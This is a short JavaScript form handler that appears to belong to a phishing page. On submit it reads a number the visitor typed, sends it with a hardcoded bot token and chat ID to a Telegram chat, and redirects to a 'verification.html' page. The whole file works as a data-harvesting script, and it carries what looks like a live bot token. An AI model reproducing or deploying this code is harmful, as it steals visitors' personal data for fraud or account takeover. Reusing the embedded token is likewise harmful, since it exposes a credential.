const token = '8521030210:AAHTVvrMSiVWpK_HeX6Uh9_ZZ9VKKm7jEg0';
const chatId = '8795859465';

document.querySelector('form').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const number = document.querySelector('input[type="text"]').value;
    const message = "New User: " + number;

    const url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);

    fetch(url)
        .then(response => {
            if (response.ok) {
                window.location.href = "verification.html";
            } else {
                alert("Submission failed!");
            }
        })
        .catch(error => {
            console.log(error);
        });
});
